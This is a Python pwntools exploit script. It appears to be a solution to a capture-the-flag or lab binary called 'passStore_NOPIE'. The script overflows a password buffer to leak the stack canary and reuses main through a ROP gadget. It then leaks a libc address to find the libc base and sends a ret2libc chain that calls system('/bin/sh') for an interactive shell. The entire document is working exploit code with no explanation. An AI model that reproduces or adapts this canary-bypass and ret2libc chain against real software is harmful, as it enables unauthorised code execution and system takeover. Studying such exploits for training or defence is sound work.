from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

#payload leak canary
payload1 = b"a"*56
r.sendline(payload1)

print(r.recvline())

canary = b"\x00"  +  r.recv(7).split(b"\n")[0] 
canary += b"\x00"*(8 - len(canary))
log.info("Leaked canary: " + str(hex(u64(canary))))
log.info("---------------------------------------")

main = binary.symbols['main'] #0x0000000000401245
ret = rop.find_gadget(['ret'])[0] #0x000000000040101a

#payload to call main again
payload2 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p64(ret) + p64(main)
r.sendlineafter(b"Retype: ",payload2)
log.info("---------------------------------------")

#payload leak runtime address, to cal libc_base
payload3 = b"a"*23
r.sendlineafter(b"Type the password:",payload3)
print(r.recvline())

res = r.recv().split(b"\nRetype")[0].strip().ljust(8,b"\x00")

print(str(hex(u64(res))))

leaked_runtime_addr = u64(res) - 0x96 #setbuf
leaked_offset = libc.symbols['_IO_setbuffer'] #0x0000000000081540

libc_base = leaked_runtime_addr - leaked_offset
log.info("libc base addr : " + hex(leaked_runtime_addr))  


system_offset = libc.symbols['system'] #0x0000000000050d60
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

# payload get shell
junk = b"a"*56 + p64(u64(canary)) + b"a"*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()